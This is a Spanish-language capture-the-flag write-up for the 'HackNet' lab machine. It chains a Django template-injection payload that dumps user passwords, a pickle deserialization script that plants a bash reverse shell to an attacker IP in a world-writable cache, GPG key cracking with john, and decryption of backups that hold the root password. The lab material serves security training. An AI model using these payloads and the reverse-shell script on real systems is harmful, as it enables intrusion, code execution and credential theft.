### 1. Enumeración inicial

Vamos a comenzar enumerando los puertos abiertos de la máquina:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.85 -oG allPorts
[sudo] contraseña para abra: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-11 14:52 +0000
Initiating SYN Stealth Scan at 14:52
Scanning 10.10.11.85 [65535 ports]
Discovered open port 22/tcp on 10.10.11.85
Discovered open port 80/tcp on 10.10.11.85
Completed SYN Stealth Scan at 14:52, 13.55s elapsed (65535 total ports)
Nmap scan report for 10.10.11.85
Host is up, received user-set (0.072s latency).
Scanned at 2025-11-11 14:52:32 WET for 14s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
           Raw packets sent: 67353 (2.964MB) | Rcvd: 66917 (2.677MB)
```

Echaremos un vistazo al sitio web que está alojando la máquina en el puerto 80, añadimos al **/etc/hosts** el dominio `hacknet.htb`.

---
### 2. Enumeración web y descubrimiento de SSTI

Nos creamos una cuenta en el sitio. Entre las cosas que tiene la página, hay una función **para ver quién le ha dado like a un post**. Si lo pasamos por el proxy web, nos daremos cuenta de que en la respuesta devuelve el nombre de usuario de las personas que le han dado like, en este caso yo le di like al post para probar.

![[1]](img/1.png)

Hay un **SSTI**, el nombre de usuario no lo sanitiza correctamente el engine **Django**, detectado con la extensión de navegador **Wappalizer**. 

Si vamos a nuestro perfil en el sitio web, y le cambiamos el username a algo tipo **`{% debug %}`**, veremos que nos lo interpreta en la respuesta en vez de mostrarse en texto claro. Para la explotación vamos a cambiar el nombre de nuestro usuario a **`{{users.values}}`**, el payload devuelve los datos de los usuarios, incluyendo **su contraseña**:

![[2]](img/2.png)

En este caso me muestra los datos de mi usuario únicamente ya que es una petición a un post que tenía 0 likes, pero si damos like a un post con 13 likes que se encuentra en la segunda página, e interceptamos la petición a **likes**, **veremos la info de todos los usuarios que le hayan dado like en ese post**:

![[3]](img/3.png)

Esta es la petición con todos los usuarios y contraseñas que le han dado like a dicho post:

```html
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Tue, 11 Nov 2025 16:47:27 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Frame-Options: DENY
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Content-Length: 9156

<div class="likes-review-item"><a href="/profile/1"><img src="/media/1.jpg" title="cyberghost"></a></div>
<div class="likes-review-item"><a href="/profile/2"><img src="/media/2.jpg" title="hexhunter"></a></div>
<div class="likes-review-item"><a href="/profile/3"><img src="/media/3.jpg" title="rootbreaker"></a></div>
<div class="likes-review-item"><a href="/profile/7"><img src="/media/7.png" title="blackhat_wolf"></a></div>
<div class="likes-review-item"><a href="/profile/8"><img src="/media/8.png" title="bytebandit"></a></div>
<div class="likes-review-item"><a href="/profile/10"><img src="/media/10.png" title="datadive"></a></div>
<div class="likes-review-item"><a href="/profile/11"><img src="/media/11.png" title="phreaker"></a></div>
<div class="likes-review-item"><a href="/profile/15"><img src="/media/15.png" title="darkseeker"></a></div>
<div class="likes-review-item"><a href="/profile/16"><img src="/media/16.png" title="shadowmancer"></a></div>
<div class="likes-review-item"><a href="/profile/17"><img src="/media/17.jpg" title="trojanhorse"></a></div>
<div class="likes-review-item"><a href="/profile/18"><img src="/media/18.jpg" title="backdoor_bandit"></a></div>
<div class="likes-review-item"><a href="/profile/19"><img src="/media/19.jpg" title="exploit_wizard"></a></div>
<div class="likes-review-item"><a href="/profile/24"><img src="/media/24.jpg" title="brute_force"></a></div>
<div class="likes-review-item"><a href="/profile/25"><img src="/media/25.jpg" title="shadowwalker"></a></div>
<div class="likes-review-item"><a href="/profile/27"><img src="/media/image.php" title="&lt;QuerySet [{&#x27;id&#x27;: 1, &#x27;email&#x27;: &#x27;cyberghost@darkmail.net&#x27;, &#x27;username&#x27;: &#x27;cyberghost&#x27;, &#x27;password&#x27;: &#x27;Gh0stH@cker2024&#x27;, &#x27;picture&#x27;: &#x27;1.jpg&#x27;, &#x27;about&#x27;: &#x27;A digital nomad with a knack for uncovering vulnerabilities in the deep web. Passionate about cryptography and secure communications.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 2, &#x27;email&#x27;: &#x27;hexhunter@ciphermail.com&#x27;, &#x27;username&#x27;: &#x27;hexhunter&#x27;, &#x27;password&#x27;: &#x27;H3xHunt3r!&#x27;, &#x27;picture&#x27;: &#x27;2.jpg&#x27;, &#x27;about&#x27;: &#x27;A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 3, &#x27;email&#x27;: &#x27;rootbreaker@exploitmail.net&#x27;, &#x27;username&#x27;: &#x27;rootbreaker&#x27;, &#x27;password&#x27;: &#x27;R00tBr3@ker#&#x27;, &#x27;picture&#x27;: &#x27;3.jpg&#x27;, &#x27;about&#x27;: &#x27;Expert in privilege escalation and bypassing security measures. Always on the lookout for new zero-day vulnerabilities.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 7, &#x27;email&#x27;: &#x27;blackhat_wolf@cypherx.com&#x27;, &#x27;username&#x27;: &#x27;blackhat_wolf&#x27;, &#x27;password&#x27;: &#x27;Bl@ckW0lfH@ck&#x27;, &#x27;picture&#x27;: &#x27;7.png&#x27;, &#x27;about&#x27;: &#x27;A black hat hacker with a passion for ransomware development. Has a reputation for leaving no trace behind.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 8, &#x27;email&#x27;: &#x27;bytebandit@exploitmail.net&#x27;, &#x27;username&#x27;: &#x27;bytebandit&#x27;, &#x27;password&#x27;: &#x27;Byt3B@nd!t123&#x27;, &#x27;picture&#x27;: &#x27;8.png&#x27;, &#x27;about&#x27;: &#x27;A skilled penetration tester and ethical hacker. Enjoys dismantling security systems and exposing their weaknesses.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: False, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 10, &#x27;email&#x27;: &#x27;datadive@darkmail.net&#x27;, &#x27;username&#x27;: &#x27;datadive&#x27;, &#x27;password&#x27;: &#x27;D@taD1v3r&#x27;, &#x27;picture&#x27;: &#x27;10.png&#x27;, &#x27;about&#x27;: &#x27;A data miner and analyst with a focus on extracting and analyzing large datasets from breached databases.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 11, &#x27;email&#x27;: &#x27;phreaker@securemail.org&#x27;, &#x27;username&#x27;: &#x27;phreaker&#x27;, &#x27;password&#x27;: &#x27;Phre@k3rH@ck&#x27;, &#x27;picture&#x27;: &#x27;11.png&#x27;, &#x27;about&#x27;: &#x27;Old-school hacker with roots in phone phreaking. Now enjoys exploiting telecom systems and VoIP networks.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: False, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 15, &#x27;email&#x27;: &#x27;darkseeker@darkmail.net&#x27;, &#x27;username&#x27;: &#x27;darkseeker&#x27;, &#x27;password&#x27;: &#x27;D@rkSeek3r#&#x27;, &#x27;picture&#x27;: &#x27;15.png&#x27;, &#x27;about&#x27;: &#x27;A hacker who thrives in the dark web. Specializes in anonymity tools and hidden service exploitation.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 16, &#x27;email&#x27;: &#x27;shadowmancer@cypherx.com&#x27;, &#x27;username&#x27;: &#x27;shadowmancer&#x27;, &#x27;password&#x27;: &#x27;Sh@d0wM@ncer&#x27;, &#x27;picture&#x27;: &#x27;16.png&#x27;, &#x27;about&#x27;: &#x27;A master of disguise in the digital world, using cloaking techniques and evasion tactics to remain unseen.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 17, &#x27;email&#x27;: &#x27;trojanhorse@securemail.org&#x27;, &#x27;username&#x27;: &#x27;trojanhorse&#x27;, &#x27;password&#x27;: &#x27;Tr0j@nH0rse!&#x27;, &#x27;picture&#x27;: &#x27;17.jpg&#x27;, &#x27;about&#x27;: &#x27;Malware developer with a focus on creating and deploying Trojan horses. Enjoys watching systems crumble from within.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: False, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 18, &#x27;email&#x27;: &#x27;mikey@hacknet.htb&#x27;, &#x27;username&#x27;: &#x27;backdoor_bandit&#x27;, &#x27;password&#x27;: &#x27;mYd4rks1dEisH3re&#x27;, &#x27;picture&#x27;: &#x27;18.jpg&#x27;, &#x27;about&#x27;: &#x27;Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an attack.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 1, &#x27;is_public&#x27;: False, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: True}, {&#x27;id&#x27;: 19, &#x27;email&#x27;: &#x27;exploit_wizard@hushmail.com&#x27;, &#x27;username&#x27;: &#x27;exploit_wizard&#x27;, &#x27;password&#x27;: &#x27;Expl01tW!zard&#x27;, &#x27;picture&#x27;: &#x27;19.jpg&#x27;, &#x27;about&#x27;: &#x27;An expert in exploit development and vulnerability research. Loves crafting new ways to break into systems.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 24, &#x27;email&#x27;: &#x27;brute_force@ciphermail.com&#x27;, &#x27;username&#x27;: &#x27;brute_force&#x27;, &#x27;password&#x27;: &#x27;BrUt3F0rc3#&#x27;, &#x27;picture&#x27;: &#x27;24.jpg&#x27;, &#x27;about&#x27;: &#x27;Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 25, &#x27;email&#x27;: &#x27;shadowwalker@hushmail.com&#x27;, &#x27;username&#x27;: &#x27;shadowwalker&#x27;, &#x27;password&#x27;: &#x27;Sh@dowW@lk2024&#x27;, &#x27;picture&#x27;: &#x27;25.jpg&#x27;, &#x27;about&#x27;: &#x27;A digital infiltrator who excels in covert operations. Always finds a way to walk through the shadows undetected.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: False, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 27, &#x27;email&#x27;: &#x27;a@gmail.com&#x27;, &#x27;username&#x27;: &#x27;{{users.values}}&#x27;, &#x27;password&#x27;: &#x27;123456&#x27;, &#x27;picture&#x27;: &#x27;image.php&#x27;, &#x27;about&#x27;: &#x27;&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: True, &#x27;two_fa&#x27;: False}]&gt;"></a></div>
```

Hay un usuario que en la web tiene el perfil en privado, y es el que más nos interesa porque tiene de correo un hacknet.htb:

`mikey@hacknet.htb:mYd4rks1dEisH3re`, que en la página se muestra con el username `backdoor_bandit`.

---
### 3. Acceso inicial y user flag

Nos podemos conectar a la máquina por el **SSH** que tiene abierto con sus credenciales:

```shell
❯ ssh mikey@10.10.11.85
mikey@10.10.11.85's password: 
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov 11 11:52:28 2025 from 10.10.14.209
mikey@hacknet:~$ 
```

---
### 4. Escalada de privilegios a sandy mediante deserialización

En `/home` hay un usuario `sandy`, tocará escalar a dicho usuario. No tenemos permisos de sudo ni hay archivos SUID que sirvan. Toca tirar por los archivos del sistema relacionados a `Django`, tiene un directorio que almacena la caché, **y tenemos permisos 777 sobre el directorio.** 

Para que se cree la caché, es tan simple como mandar una petición al servidor, en este caso pillo la cookie de sesión **y el csrf token** almacenados del navegador y mando la petición con curl:

```shell
curl -H "Cookie: sessionid=qm4c138c8xk9z12by2t4ti28zq291ulz; csrftoken=zTSZVFzxUpaa08GhR8Tp7OO76JzWYVfE" http://hacknet.htb/explore >/dev/null
```

Veremos que se crearán dos archivos de caché en la máquina vulnerable, en `/var/tmp/django_cache`:

```shell
mikey@hacknet:/var/tmp/django_cache$ ls 
1f0acfe7480a469402f1852f8313db86.djcache  90dbab8f3b1e54369abdeb4ba1efc106.djcache
```

Con esto vamos a hacer un **Pickle Deserialization Attack**, vamos a pasar un payload para que nos mande la máquina una **reverse shell**. Convertiremos el payload a base64, y en cada archivo caché, mediante un script, vamos a insertarlo en formato de **objeto Pickle**. 

Esto lo que hará, es que cuando un usuario haga cualquier petición a la página web donde hemos enviado el curl, **/explore en este caso**, va a cargar a través de las cookies infectadas el objeto pickle, lo que es lo mismo, nos mandará la reverse shell.

Entonces, en primer lugar convertimos el payload que nos mandará la reverse shell a base64 (ajustar IP y puerto al de la máquina vuestra):

```shell
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.209/4444 0>&1"' | base64 -w0

YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDkvNDQ0NCAwPiYxIgo=
```

Le metemos el payload a este script de python que vamos a crear en **/tmp**:

```python
import pickle  
import base64  
import os  
import time  
  
# ---- Configuración ----
  
cache_dir = "/var/tmp/django_cache"  
cmd = "printf YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDkvNDQ0NCAwPiYxIgo=|base64 -d|bash"  
  
# ---- Generar payload Pickle ----
  
class RCE:  
    def __reduce__(self):  
        return (os.system, (cmd,),)  
  
payload = pickle.dumps(RCE())  
  
# ---- Escribir en cada archivo cache ----
  
for filename in os.listdir(cache_dir):  
    if filename.endswith(".djcache"):  
        path = os.path.join(cache_dir, filename)  
        try:  
            os.remove(path)  # Eliminar archivo original  
        except:  
            continue  
        with open(path, "wb") as f:  
            f.write(payload)  # Escribir payload pickle  
        print(f"[+] Payload escrito en {filename}")
```

Este script va a borrar los archivos caché que crea el servidor cada vez que se hace una petición al sitio web, **y los sobrescribirá por el objeto pickle con el payload malicioso**.

```shell
mikey@hacknet:/tmp$ python3 prueba.py
[+] Payload escrito en 1f0acfe7480a469402f1852f8313db86.djcache
[+] Payload escrito en 90dbab8f3b1e54369abdeb4ba1efc106.djcache
```

Ahora si visitamos por ejemplo http://hacknet.htb/explore, nos debe mandar la reverse shell a nuestra máquina atacante escuchando por el puerto 4444.

```shell
penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.10.0.100 • 192.168.0.1 • 172.17.0.1 • 10.10.14.209
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from hacknet~10.10.11.85-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/abra/.penelope/sessions/hacknet~10.10.11.85-Linux-x86_64/2025_11_11-17_37_11-129.log 📜
────────────────────────────────────────────────────────────────────────────────────
sandy@hacknet:/var/www/HackNet$ whoami
sandy
```

Tenemos acceso al usuario Sandy y a la **user flag**, ahora toca **escalar a root**. 

---
### 5. Enumeración de backups y análisis de archivo GPG

Enumerando la máquina con el usuario `sandy`, nos encontramos con estos archivos de backup:

```shell
sandy@hacknet:/var/www/HackNet/backups$ ls
backup01.sql.gpg  backup02.sql.gpg  backup03.sql.gpg
```

Nos vamos a mandar estos archivos a la máquina local de atacante,y también el archivo `armored_key.asc`, que se encuentra en `/home/sandy/.gnupg/private-keys-v1.d`.

Lo podemos hacer abriendo un server por el puerto 8000 en la máquina víctima con python por ejemplo, y bajando los archivos con wget en nuestra máquina.

El archivo `armored_key.asc` lo pasamos por la herramienta **gpg2john**, debemos obtener el **hash** de la clave privada para crackearlo posteriormente. 

```shell
gpg2john armored_key.asc

File armored_key.asc
Sandy:$gpg$*1*348*1024*db7e6d165a1d86f43276a4a61a9865558a3b67dbd1c6b0c25b960d293cd490d0f54227788f93637a930a185ab86bc6d4bfd324fdb4f908b41696f71db01b3930cdfbc854a81adf642f5797f94ddf7e67052ded428ee6de69fd4c38f0c6db9fccc6730479b48afde678027d0628f0b9046699033299bc37b0345c51d7fa51f83c3d857b72a1e57a8f38302ead89537b6cb2b88d0a953854ab6b0cdad4af069e69ad0b4e4f0e9b70fc3742306d2ddb255ca07eb101b07d73f69a4bd271e4612c008380ef4d5c3b6fa0a83ab37eb3c88a9240ddeda8238fd202ccc9cf076b6d21602dd2394349950be7de440618bf93bcde73e68afa590a145dc0e1f3c87b74c0e2a96c8fe354868a40ec09dd217b815b310a41449dc5fbdfca513fadd5eeae42b65389aecc628e94b5fb59cce24169c8cd59816681de7b58e5f0d0e5af267bc75a8efe0972ba7e6e3768ec96040488e5c7b2aa0a4eb1047e79372b3605*3*254*2*7*16*db35bd29d9f4006bb6a5e01f58268d96*65011712*850ffb6e35f0058b:::Sandy (My key for backups) <sandy@hacknet.htb>::armored_key.asc
```

Metemos todo ese output en un archivo `hash.txt` y lo pasamos por **john** usando el diccionario de contraseñas **rockyou.txt**:

```shell
john --format=gpg hash.txt --wordlist=/home/abra/Documentos/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
sweetheart       (Sandy)     
1g 0:00:00:02 DONE (2025-11-11 17:50) 0.3984g/s 172.1p/s 172.1c/s 172.1C/s gandako..nicole1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Importamos la clave privada en nuestra máquina de atacante con la contraseña `sweetheart`:

```shell
gpg --import armored_key.asc
gpg: clave D72E5C1FA19C12F7: clave pública "Sandy (My key for backups) <sandy@hacknet.htb>" importada
gpg: clave D72E5C1FA19C12F7: clave secreta importada
gpg: Cantidad total procesada: 1
gpg:               importadas: 1
gpg:       claves secretas leídas: 1
gpg:   claves secretas importadas: 1
```

---
### 6. Extracción de credenciales y escalada a root

Desencriptamos los archivos de backup:

```shell
gpg --output backup02.sql --decrypt backup02.sql.gpg
gpg: encrypted with rsa1024 key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
```

En este caso el contenido importante para seguir avanzando con la máquina está en el fichero `backup02.sql`. Filtraremos por la palabra **password** usando grep:

```sql
cat backup02.sql | grep "password"
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
  `password` varchar(70) NOT NULL,
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
  `password` varchar(128) NOT NULL,
```

Vemos varios mensajes entre dos personas, entre ellos está una contraseña: `h4ck3rs4re3veRywh3re99`. Esa contraseña es la del usuario **root**, con esto hemos vulnerado la máquina con éxito.

```shell
sandy@hacknet:~/.gnupg/private-keys-v1.d$ su root
Password: 
root@hacknet:/home/sandy/.gnupg/private-keys-v1.d# 
```